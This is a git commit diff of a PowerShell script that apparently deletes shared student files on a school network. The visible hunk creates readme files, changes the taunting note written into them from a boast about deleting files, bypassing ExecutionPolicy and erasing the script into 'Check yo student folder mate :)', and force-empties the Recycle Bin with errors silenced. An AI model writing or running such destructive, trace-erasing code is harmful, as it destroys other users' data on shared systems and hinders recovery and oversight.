47f09922c5e793876d35cab710299dd2e857c95f
wechicken456 <55309735+wechicken456@users.noreply.github.com>
2022-10-25 15:44:40 -0400

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -11,5 +11,5 @@ while ($i -lt 10){
 	New-Item .\readme$i.txt -Force
 	$i++
 }
-Set-Content readme* "All the files that are accessible by all the students on the network (only the shared files were deleted, their student folders were not affected - well, except if you're the one using the computer) have been deleted.`nI bypassed ExecutionPolicy since it's not really that secure.`rI also deleted my script and emptied the Recycle Bin :)" -Force -ErrorAction silentlycontinue
+Set-Content readme* "Check yo student folder mate :)" -Force -ErrorAction silentlycontinue
 Clear-RecycleBin -Force -ErrorAction silentlycontinue
